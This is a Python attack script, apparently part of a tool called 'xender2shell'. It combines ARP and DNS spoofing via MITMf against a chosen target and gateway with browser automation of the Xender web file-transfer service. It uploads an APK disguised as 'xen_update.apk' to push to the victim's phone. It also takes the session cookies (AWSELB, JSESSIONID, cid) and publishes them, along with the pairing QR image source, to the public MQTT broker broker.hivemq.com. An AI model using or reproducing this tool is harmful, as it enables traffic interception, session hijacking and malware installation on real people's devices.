from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import paho.mqtt.client as mqtt
import time
import json
import requests
import signal
import subprocess
import os
import sys
client = mqtt.Client()

client.connect("broker.hivemq.com", 1883, 60)

target = '{}'.format(sys.argv[1])

gateway = '{}'.format(sys.argv[2])

mitmf = subprocess.Popen(['mitmf', '-i', 'eth1', '--spoof', '--arp', '--dns', '--analyze', '--ferretng', '--gateway', gateway, '--target', target])
print "starting browser"
driver = webdriver.Firefox()
driver.get("http://web.xender.com")
try:
    element = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.TAG_NAME, "img"))
    )

except:
    pass


while True:
    try:
         time.sleep(2)
         image = driver.find_element_by_tag_name("img")
         img_src = image.get_attribute("src")
         # print img_src
         client.publish("xender", str(img_src))
         app_bar = driver.find_element_by_class_name("appModule_ic")
         if app_bar:
            print "Found application button"
            print app_bar.click()
            install_app = driver.find_element_by_class_name("installApp_btn")
            if install_app:
                #install_app.click()
                upload = driver.find_element_by_id("modelUpload")
                upload.send_keys(r"/root/xender2shell/xen_update.apk")
                #time.sleep(5)
                client.publish("xender", "update")
                #pickle.dump(driver.get_cookies(),open("cookies.pkl","wb"))
                AWSELB = driver.get_cookie("AWSELB")
                JS = driver.get_cookie("JSESSIONID")
                cid = driver.get_cookie("cid")
                print AWSELB["value"]
                print JS["value"]
                print cid["value"]
		cookie = '{"AWSELB":"' + AWSELB["value"] + '","JSESSIONID":"' + JS["value"] + '","cid":"' + cid["value"] + '"}'
                client.publish("xender", cookie)
                time.sleep(3)
                mitmf.kill()
		time.sleep(3)
		client.publish("xender", "refresh")
                os.killpg(os.getpgid(mitmf.pid), signal.SIGINT)

    except Exception as e:
        print e


